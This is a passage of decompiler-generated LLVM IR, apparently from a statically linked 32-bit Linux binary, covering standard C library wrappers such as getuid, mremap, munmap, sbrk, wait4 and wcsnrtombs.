  %v1_8054690 = call i32 @__errno_location(i32 %v0_8054690)
  %v0_8054695 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054695 = sub i32 0, %v0_8054695
  %v2_8054697 = inttoptr i32 %v1_8054690 to i32*
  store i32 %v1_8054695, i32* %v2_8054697, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805469c

dec_label_pc_805469c:                             ; preds = %entry, %dec_label_pc_8054690
  %v0_805469d = phi i32 [ %v1_8054685, %entry ], [ -1, %dec_label_pc_8054690 ]
  %v2_80546a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80546a0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805469d

; uselistorder directives
  uselistorder i32 %v1_8054685, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805469c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80546a4, i32* %stack_var_-4, align 4
  %v1_80546ad = call i32 @int80_syscall(i32 199)
  store i32 %v1_80546ad, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80546ad, -4095
  br i1 %tmp, label %dec_label_pc_80546c4, label %dec_label_pc_80546b8

dec_label_pc_80546b8:                             ; preds = %entry
  %v0_80546b8 = load i32, i32* %stack_var_-4, align 4
  %v1_80546b8 = call i32 @__errno_location(i32 %v0_80546b8)
  %v0_80546bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546bd = sub i32 0, %v0_80546bd
  %v2_80546bf = inttoptr i32 %v1_80546b8 to i32*
  store i32 %v1_80546bd, i32* %v2_80546bf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80546c4

dec_label_pc_80546c4:                             ; preds = %entry, %dec_label_pc_80546b8
  %v0_80546c5 = phi i32 [ %v1_80546ad, %entry ], [ -1, %dec_label_pc_80546b8 ]
  %v2_80546c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80546c8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80546c5

; uselistorder directives
  uselistorder i32 %v1_80546ad, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546c4, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80546cc = load i32, i32* @edi, align 4
  %v0_80546cd = load i32, i32* @esi, align 4
  store i32 %v0_80546cd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80546e5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80546ed = call i32 @mremap(i32 %v0_80546e5, i32 %v0_80546cd, i32 %v0_80546cc, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80546e5, i32* @ebx, align 4
  store i32 %v6_80546ed, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80546ed, -4095
  br i1 %tmp, label %dec_label_pc_8054705, label %dec_label_pc_80546f9

dec_label_pc_80546f9:                             ; preds = %entry
  %v1_80546f9 = call i32 @__errno_location(i32 %v0_80546e5)
  %v0_80546fe = load i32, i32* %esi.global-to-local, align 4
  %v1_80546fe = sub i32 0, %v0_80546fe
  %v2_8054700 = inttoptr i32 %v1_80546f9 to i32*
  store i32 %v1_80546fe, i32* %v2_8054700, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054705

dec_label_pc_8054705:                             ; preds = %entry, %dec_label_pc_80546f9
  %v0_8054706 = phi i32 [ %v6_80546ed, %entry ], [ -1, %dec_label_pc_80546f9 ]
  %v2_8054705 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054705, i32* @edx, align 4
  %v2_8054708 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054708, i32* @esi, align 4
  store i32 %v0_80546cc, i32* @edi, align 4
  ret i32 %v0_8054706

; uselistorder directives
  uselistorder i32 %v6_80546ed, { 1, 0, 2 }
  uselistorder i32 %v0_80546e5, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054705, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805470c = load i32, i32* @ebx, align 4
  store i32 %v0_805470c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805471f = call i32 @munmap(i32 %v0_805470c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805471f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805471f, -4095
  br i1 %tmp, label %dec_label_pc_8054738, label %dec_label_pc_805472c

dec_label_pc_805472c:                             ; preds = %entry
  %v0_805472c = load i32, i32* %stack_var_-4, align 4
  %v1_805472c = call i32 @__errno_location(i32 %v0_805472c)
  %v0_8054731 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054731 = sub i32 0, %v0_8054731
  %v2_8054733 = inttoptr i32 %v1_805472c to i32*
  store i32 %v1_8054731, i32* %v2_8054733, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054738

dec_label_pc_8054738:                             ; preds = %entry, %dec_label_pc_805472c
  %v0_8054739 = phi i32 [ %v4_805471f, %entry ], [ -1, %dec_label_pc_805472c ]
  %v2_8054738 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054738, i32* @edx, align 4
  %v2_805473c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805473c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054739

; uselistorder directives
  uselistorder i32 %v4_805471f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054738, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054740 = load i32, i32* @ebx, align 4
  store i32 %v0_8054740, i32* %stack_var_-4, align 4
  %v4_8054744 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8054744, i32* %ebx.global-to-local, align 4
  %v6_8054753 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8054753, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8054753, -4095
  br i1 %tmp, label %dec_label_pc_805476c, label %dec_label_pc_8054760

dec_label_pc_8054760:                             ; preds = %entry
  %v0_8054760 = load i32, i32* %stack_var_-4, align 4
  %v1_8054760 = call i32 @__errno_location(i32 %v0_8054760)
  %v0_8054765 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054765 = sub i32 0, %v0_8054765
  %v2_8054767 = inttoptr i32 %v1_8054760 to i32*
  store i32 %v1_8054765, i32* %v2_8054767, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805476c

dec_label_pc_805476c:                             ; preds = %entry, %dec_label_pc_8054760
  %v0_805476d = phi i32 [ %v6_8054753, %entry ], [ -1, %dec_label_pc_8054760 ]
  %v2_805476c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805476c, i32* @edx, align 4
  %v2_8054770 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054770, i32* @ebx, align 4
  ret i32 %v0_805476d

; uselistorder directives
  uselistorder i32 %v6_8054753, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805476c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8054775 = load i32, i32* @ebx, align 4
  %v0_8054779 = load i32, i32* @global_var_8068804.777, align 4
  %v1_8054779 = icmp eq i32 %v0_8054779, 0
  %v1_8054784 = icmp eq i1 %v1_8054779, false
  br i1 %v1_8054784, label %dec_label_pc_8054797, label %dec_label_pc_8054786

dec_label_pc_8054786:                             ; preds = %entry
  %v1_805478b = call i32 @__GI_brk(i32 0)
  %v2_8054793 = icmp slt i32 %v1_805478b, 0
  br i1 %v2_8054793, label %dec_label_pc_80547b9, label %dec_label_pc_8054786.dec_label_pc_8054797_crit_edge

dec_label_pc_8054786.dec_label_pc_8054797_crit_edge: ; preds = %dec_label_pc_8054786
  %v0_8054799.pre = load i32, i32* @global_var_8068804.777, align 4
  br label %dec_label_pc_8054797

dec_label_pc_8054797:                             ; preds = %dec_label_pc_8054786.dec_label_pc_8054797_crit_edge, %entry
  %v0_80547a7 = phi i32 [ %v0_8054799.pre, %dec_label_pc_8054786.dec_label_pc_8054797_crit_edge ], [ %v0_8054779, %entry ]
  %v1_8054797 = icmp eq i32 %arg1, 0
  %v1_805479e = icmp eq i1 %v1_8054797, false
  br i1 %v1_805479e, label %dec_label_pc_80547a4, label %dec_label_pc_80547a0

dec_label_pc_80547a0:                             ; preds = %dec_label_pc_8054797
  br label %dec_label_pc_80547bc

dec_label_pc_80547a4:                             ; preds = %dec_label_pc_8054797
  store i32 %v0_80547a7, i32* @ebx, align 4
  %v2_80547a9 = add i32 %v0_80547a7, %arg1
  %v1_80547ad = call i32 @__GI_brk(i32 %v2_80547a9)
  %v2_80547b5 = icmp slt i32 %v1_80547ad, 0
  %v1_80547b7 = icmp eq i1 %v2_80547b5, false
  br i1 %v1_80547b7, label %dec_label_pc_80547a4.dec_label_pc_80547bc_crit_edge, label %dec_label_pc_80547b9

dec_label_pc_80547a4.dec_label_pc_80547bc_crit_edge: ; preds = %dec_label_pc_80547a4
  %v0_80547bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80547bc

dec_label_pc_80547b9:                             ; preds = %dec_label_pc_80547a4, %dec_label_pc_8054786
  br label %dec_label_pc_80547bc

dec_label_pc_80547bc:                             ; preds = %dec_label_pc_80547a4.dec_label_pc_80547bc_crit_edge, %dec_label_pc_80547a0, %dec_label_pc_80547b9
  %v0_80547bd = phi i32 [ %v0_80547bd.pre, %dec_label_pc_80547a4.dec_label_pc_80547bc_crit_edge ], [ %v0_80547a7, %dec_label_pc_80547a0 ], [ -1, %dec_label_pc_80547b9 ]
  %v2_80547bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547bc, i32* @edx, align 4
  store i32 %v0_8054775, i32* @ebx, align 4
  ret i32 %v0_80547bd

; uselistorder directives
  uselistorder i32 %v0_80547a7, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80547bc, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80547c4 = load i32, i32* @edi, align 4
  %v0_80547c5 = load i32, i32* @esi, align 4
  store i32 %v0_80547c5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80547d9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80547e1 = call i32 @wait4(i32 %v0_80547d9, i32 %v0_80547c5, i32 %v0_80547c4, i32 %tmp5)
  store i32 %v0_80547d9, i32* @ebx, align 4
  store i32 %v4_80547e1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80547e1, -4095
  br i1 %tmp, label %dec_label_pc_80547f9, label %dec_label_pc_80547ed

dec_label_pc_80547ed:                             ; preds = %entry
  %v1_80547ed = call i32 @__errno_location(i32 %v0_80547d9)
  %v0_80547f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547f2 = sub i32 0, %v0_80547f2
  %v2_80547f4 = inttoptr i32 %v1_80547ed to i32*
  store i32 %v1_80547f2, i32* %v2_80547f4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547f9

dec_label_pc_80547f9:                             ; preds = %entry, %dec_label_pc_80547ed
  %v0_80547fa = phi i32 [ %v4_80547e1, %entry ], [ -1, %dec_label_pc_80547ed ]
  %v2_80547fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80547fc, i32* @esi, align 4
  store i32 %v0_80547c4, i32* @edi, align 4
  ret i32 %v0_80547fa

; uselistorder directives
  uselistorder i32 %v4_80547e1, { 1, 0, 2 }
  uselistorder i32 %v0_80547d9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80547f9, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80687e4.778 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8054813 = icmp eq i32 %tmp4, 0
  %v1_8054815 = icmp eq i1 %v1_8054813, false
  br i1 %v1_8054815, label %dec_label_pc_805481d, label %dec_label_pc_8054817

dec_label_pc_8054817:                             ; preds = %entry
  %v2_8054817 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_805481d

dec_label_pc_805481d:                             ; preds = %entry, %dec_label_pc_8054817
  %v0_8054839 = phi i32 [ %tmp4, %entry ], [ %v2_8054817, %dec_label_pc_8054817 ]
  %v0_8054825 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8054817 ]
  %v2_805481d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_805481d, i32* %stack_var_-8, align 4
  store i32 %v0_8054825, i32* %stack_var_-4, align 4
  %v2_8054834 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805483a = inttoptr i32 %v0_8054839 to i8*
  %v6_805483a = call i32 @__GI_wcsnrtombs(i8* %v5_805483a, i32 %v2_8054834, i32 1, i32 16, i32 %tmp)
  %v1_8054844 = icmp eq i32 %v6_805483a, 0
  %v3_8054846 = select i1 %v1_8054844, i32 1, i32 %v6_805483a
  ret i32 %v3_8054846

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_805481d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054865 = inttoptr i32 %tmp to i8*
  %v6_8054865 = call i32 @__GI_wcsnrtombs(i8* %v5_8054865, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054865
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8054873 = load i32, i32* @ebx, align 4
  %v4_8054877 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054877, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054887 = icmp eq i8* %arg1, null
  store i1 %v1_8054887, i1* %zf.global-to-local, align 1
  br i1 %v1_8054887, label %dec_label_pc_8054896, label %dec_label_pc_805488b

dec_label_pc_805488b:                             ; preds = %entry
  %v12_805488b = icmp eq i32 %v4_8054877, %arg2
  store i1 %v12_805488b, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8054892 = icmp eq i1 %v12_805488b, false
  br i1 %v1_8054892, label %dec_label_pc_80548b9, label %dec_label_pc_80548b3

dec_label_pc_8054896:                             ; preds = %entry
  %v2_8054896 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054896, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80548b7

dec_label_pc_805489f:                             ; preds = %dec_label_pc_80548c7
  %v1_805489f = call i32 @__errno_location(i32 %v0_8054873)
  %v1_80548a4 = inttoptr i32 %v1_805489f to i32*
  store i32 84, i32* %v1_80548a4, align 4
  br label %dec_label_pc_80548ed

dec_label_pc_80548af:                             ; preds = %dec_label_pc_80548ce
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80548e2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548de

dec_label_pc_80548b3:                             ; preds = %dec_label_pc_805488b
  %v2_80548b3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80548b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548b7

dec_label_pc_80548b7:                             ; preds = %dec_label_pc_8054896, %dec_label_pc_80548b3
  %v2_80548d016 = phi i32 [ %v2_8054896, %dec_label_pc_8054896 ], [ %v2_80548b3, %dec_label_pc_80548b3 ]
  %v1_80548bc12 = phi i32 [ -1, %dec_label_pc_8054896 ], [ %arg4, %dec_label_pc_80548b3 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80548b9

dec_label_pc_80548b9:                             ; preds = %dec_label_pc_805488b, %dec_label_pc_80548b7
  %v2_80548d015 = phi i32 [ %v4_8054877, %dec_label_pc_805488b ], [ %v2_80548d016, %dec_label_pc_80548b7 ]
  %v0_80548be = phi i32 [ %arg4, %dec_label_pc_805488b ], [ %v1_80548bc12, %dec_label_pc_80548b7 ]
  %v1_80548b9 = inttoptr i32 %arg2 to i32*
  %v2_80548b9 = load i32, i32* %v1_80548b9, align 4
  store i32 %v2_80548b9, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80548be, %arg3
  %v5_80548c0 = select i1 %tmp31, i32 %arg3, i32 %v0_80548be
  store i32 %v5_80548c0, i32* %edi.global-to-local, align 4
  store i32 %v5_80548c0, i32* @ecx, align 4
  %v1_80548da3 = icmp eq i32 %v5_80548c0, 0
  store i1 %v1_80548da3, i1* %zf.global-to-local, align 1
  %v1_80548dc10 = icmp eq i1 %v1_80548da3, false
  br i1 %v1_80548dc10, label %dec_label_pc_80548c7, label %dec_label_pc_80548de

dec_label_pc_80548c7:                             ; preds = %dec_label_pc_80548b9, %dec_label_pc_80548d4
  %v2_80548d0 = phi i32 [ %v2_80548d7, %dec_label_pc_80548d4 ], [ %v2_80548d015, %dec_label_pc_80548b9 ]
  %v0_80548c7 = phi i32 [ %v1_80548d4, %dec_label_pc_80548d4 ], [ %v2_80548b9, %dec_label_pc_80548b9 ]
  %v1_80548c7 = inttoptr i32 %v0_80548c7 to i32*
  %v2_80548c7 = load i32, i32* %v1_80548c7, align 4
  %v9_80548c9 = icmp eq i32 %v2_80548c7, 127
  store i1 %v9_80548c9, i1* %zf.global-to-local, align 1
  %v6_80548cc = icmp ugt i32 %v2_80548c7, 127
  br i1 %v6_80548cc, label %dec_label_pc_805489f, label %dec_label_pc_80548ce

dec_label_pc_80548ce:                             ; preds = %dec_label_pc_80548c7
  %v3_80548ce = trunc i32 %v2_80548c7 to i8
  %v4_80548ce = icmp eq i8 %v3_80548ce, 0
  store i1 %v4_80548ce, i1* %zf.global-to-local, align 1
  %v3_80548d0 = inttoptr i32 %v2_80548d0 to i8*
  store i8 %v3_80548ce, i8* %v3_80548d0, align 1
  %v0_80548d2 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80548d2, label %dec_label_pc_80548af, label %dec_label_pc_80548d4

dec_label_pc_80548d4:                             ; preds = %dec_label_pc_80548ce
  %v0_80548d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548d4 = add i32 %v0_80548d4, 4
  store i32 %v1_80548d4, i32* %ebx.global-to-local, align 4
  %v0_80548d7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80548d7 = load i32, i32* %esi.global-to-local, align 4
  %v2_80548d7 = add i32 %v1_80548d7, %v0_80548d7
  store i32 %v2_80548d7, i32* %edx.global-to-local, align 4
  %v0_80548d9 = load i32, i32* @ecx, align 4
  %v1_80548d9 = add i32 %v0_80548d9, -1
  %v8_80548d9 = icmp eq i32 %v1_80548d9, 0
  store i32 %v1_80548d9, i32* @ecx, align 4
  store i1 %v8_80548d9, i1* %zf.global-to-local, align 1
  %v1_80548dc = icmp eq i1 %v8_80548d9, false
  br i1 %v1_80548dc, label %dec_label_pc_80548c7, label %dec_label_pc_80548de

dec_label_pc_80548de:                             ; preds = %dec_label_pc_80548d4, %dec_label_pc_80548b9, %dec_label_pc_80548af
  %v0_80548e6 = phi i32 [ 0, %dec_label_pc_80548af ], [ %v2_80548b9, %dec_label_pc_80548b9 ], [ %v1_80548d4, %dec_label_pc_80548d4 ]
  %v0_80548e2 = phi i32 [ %v0_80548e2.pre, %dec_label_pc_80548af ], [ %v2_80548d015, %dec_label_pc_80548b9 ], [ %v2_80548d7, %dec_label_pc_80548d4 ]
  %v2_80548de = ptrtoint i32* %stack_var_-32 to i32
  %v12_80548e2 = icmp eq i32 %v0_80548e2, %v2_80548de
  store i1 %v12_80548e2, i1* %zf.global-to-local, align 1
  br i1 %v12_80548e2, label %dec_label_pc_80548e9, label %dec_label_pc_80548e6

dec_label_pc_80548e6:                             ; preds = %dec_label_pc_80548de
  %v1_80548e6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80548e6 = inttoptr i32 %v1_80548e6 to i32*
  store i32 %v0_80548e6, i32* %v2_80548e6, align 4
  br label %dec_label_pc_80548e9

dec_label_pc_80548e9:                             ; preds = %dec_label_pc_80548de, %dec_label_pc_80548e6
  %v0_80548e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80548eb = load i32, i32* @ecx, align 4
  %v2_80548eb = sub i32 %v0_80548e9, %v1_80548eb
  %v12_80548eb = icmp eq i32 %v2_80548eb, 0
  br label %dec_label_pc_80548ed

dec_label_pc_80548ed:                             ; preds = %dec_label_pc_805489f, %dec_label_pc_80548e9
  %storemerge = phi i1 [ %v12_80548eb, %dec_label_pc_80548e9 ], [ false, %dec_label_pc_805489f ]
  %storemerge1 = phi i32 [ %v2_80548eb, %dec_label_pc_80548e9 ], [ -1, %dec_label_pc_805489f ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80548ed = load i32, i32* @esp, align 4
  %v9_80548ed = icmp eq i32 %v0_80548ed, -28
  store i1 %v9_80548ed, i1* %zf.global-to-local, align 1
  store i32 %v0_8054873, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80548e2, { 1, 0 }
  uselistorder i32 %v2_80548d7, { 0, 2, 1 }
  uselistorder i32 %v1_80548d4, { 0, 2, 1 }
  uselistorder i32 %v2_80548c7, { 1, 2, 0 }
  uselistorder i32 %v2_80548b9, { 1, 0, 2 }
  uselistorder i32 %v0_80548be, { 1, 0 }
  uselistorder i32 %v2_80548d015, { 1, 0 }
  uselistorder i1 %v12_805488b, { 1, 0 }
  uselistorder i32 %v4_8054877, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 0, 2, 7, 4, 5, 6, 12, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 6, 3, 4, 7, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80548ed, { 1, 0 }
  uselistorder label %dec_label_pc_80548e9, { 1, 0 }
  uselistorder label %dec_label_pc_80548c7, { 1, 0 }
  uselistorder label %dec_label_pc_80548b9, { 1, 0 }
  uselistorder label %dec_label_pc_80548b7, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80548f9 = load i32, i32* @edi, align 4
  %v0_80548fb = load i32, i32* @ebx, align 4
  %v15_80548fc = ptrtoint i32* %stack_var_-28 to i32
  %v4_80548ff = ptrtoint i16* %arg1 to i32
  store i32 %v4_80548ff, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805490b4 = icmp eq i32 %arg3, 0
  store i1 %v1_805490b4, i1* %zf.global-to-local, align 1
  br i1 %v1_805490b4, label %dec_label_pc_805496c, label %dec_label_pc_8054910.lr.ph

dec_label_pc_8054910.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054910

dec_label_pc_8054910:                             ; preds = %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge, %dec_label_pc_8054910.lr.ph
  %v0_805491d = phi i32 [ %v4_80548ff, %dec_label_pc_8054910.lr.ph ], [ %v0_805491d.pre, %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge ]
  %v0_805491c = phi i32 [ %arg2, %dec_label_pc_8054910.lr.ph ], [ %v2_805492e, %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge ]
  %v0_8054918.in = phi i32 [ %arg3, %dec_label_pc_8054910.lr.ph ], [ %v2_805492c, %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge ]
  %v4_8054918 = phi i32 [ %arg3, %dec_label_pc_8054910.lr.ph ], [ %v2_805492c, %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge ]
  %v0_8054918 = icmp slt i32 %v0_8054918.in, 0
  store i32 %v4_8054918, i32* %esi.global-to-local, align 4
  %v2_8054918 = icmp eq i1 %v0_8054918, false
  %v5_8054918 = select i1 %v2_8054918, i32 %v4_8054918, i32 2147483647
  store i32 %v5_8054918, i32* %eax.global-to-local, align 4
  %v1_805491d = add i32 %v0_805491d, 4
  %v2_805491d = inttoptr i32 %v1_805491d to i32*
  %v3_805491d = load i32, i32* %v2_805491d, align 4
  %tmp36 = inttoptr i32 %v0_805491c to i32*
  %v5_8054920 = call i32 @__libc_write(i32 %v3_805491d, i32* %tmp36, i32 %v5_8054918)
  store i32 %v5_8054920, i32* %eax.global-to-local, align 4
  %v1_8054928 = icmp eq i32 %v5_8054920, 0
  store i1 %v1_8054928, i1* %zf.global-to-local, align 1
  %v2_8054928 = icmp slt i32 %v5_8054920, 0
  br i1 %v2_8054928, label %dec_label_pc_8054932, label %dec_label_pc_805492c

dec_label_pc_805492c:                             ; preds = %dec_label_pc_8054910
  %v0_805492c = load i32, i32* @ebx, align 4
  %v2_805492c = sub i32 %v0_805492c, %v5_8054920
  %v12_805492c = icmp eq i32 %v2_805492c, 0
  store i32 %v2_805492c, i32* @ebx, align 4
  %v0_805492e = load i32, i32* @edi, align 4
  %v2_805492e = add i32 %v0_805492e, %v5_8054920
  store i32 %v2_805492e, i32* @edi, align 4
  store i1 %v12_805492c, i1* %zf.global-to-local, align 1
  br i1 %v12_805492c, label %dec_label_pc_805496c, label %dec_label_pc_805492c.dec_label_pc_8054910_crit_edge

dec_label_pc_805492c.dec_label_pc_8054910_crit_edge: ; preds = %dec_label_pc_805492c
  %v0_805491d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054910

dec_label_pc_8054932:                             ; preds = %dec_label_pc_8054910
  %v0_8054932 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054932 = inttoptr i32 %v0_8054932 to i32*
  %v2_8054932 = load i32, i32* %v1_8054932, align 4
  store i32 %v2_8054932, i32* %eax.global-to-local, align 4
  %v1_8054935 = add i32 %v0_8054932, 8
  %v2_8054935 = inttoptr i32 %v1_8054935 to i32*
  %v3_8054935 = load i32, i32* %v2_8054935, align 4
  store i32 %v3_8054935, i32* @edx, align 4
  %v1_8054938 = or i32 %v2_8054932, 8
  store i32 %v1_8054938, i32* %eax.global-to-local, align 4
  %v1_805493b = trunc i32 %v1_8054938 to i16
  %v3_805493b = inttoptr i32 %v0_8054932 to i16*
